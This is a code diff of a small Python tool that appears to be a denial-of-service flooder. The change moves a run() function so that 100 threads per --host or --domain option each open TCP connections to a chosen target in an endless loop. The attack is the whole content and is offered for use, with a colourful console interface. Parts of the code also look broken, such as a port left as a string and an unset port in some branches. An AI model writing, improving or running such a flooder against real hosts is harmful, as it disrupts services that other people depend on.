@@ -41,6 +41,13 @@ class colors:
     bold = '\033[1m'
     underline = '\033[4m'
     magenta = '\033[95m'
+    
+def run(h):
+    while True:
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((host,port))
+        print("Packet send to " + host)
+
 
 
 writer = pystyle.Write.Print
@@ -85,18 +92,30 @@ if "--host" in lis:
     if "--port" in lis:
         host = lis[lis.index('--host')+1]
         port = lis[lis.index('--host')+2]
+        for i in range(100):
+            t = threading.Thread(target=run, args=[i])
+            t.start()
     
     else:
         host = lis[lis.index('--host')+1]
+        for i in range(100):
+            t = threading.Thread(target=run, args=[i])
+            t.start()
 
 if "--domain" in lis:
     
     if "--port" in lis:
         host = socket.gethostbyname(lis[lis.index('--domain')+1])
         port = lis[lis.index('--domain')+2]
+        for i in range(100):
+            t = threading.Thread(target=run, args=[i])
+            t.start()
     
     else:
         host = socket.gethostbyname(lis[lis.index('--domain')+1])
+        for i in range(100):
+            t = threading.Thread(target=run, args=[i])
+            t.start()
 
 if "--help" in lis:
     usageHelp()
@@ -104,12 +123,4 @@ if "--help" in lis:
 if len(lis) == 1:
     print(usageConsole())
 
-def run(h):
-    while True:
-        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((host,port))
-        print("Packet send to " + host)
 
-for i in range(100):
-    t = threading.Thread(target=run, args=[i])
-    t.start()
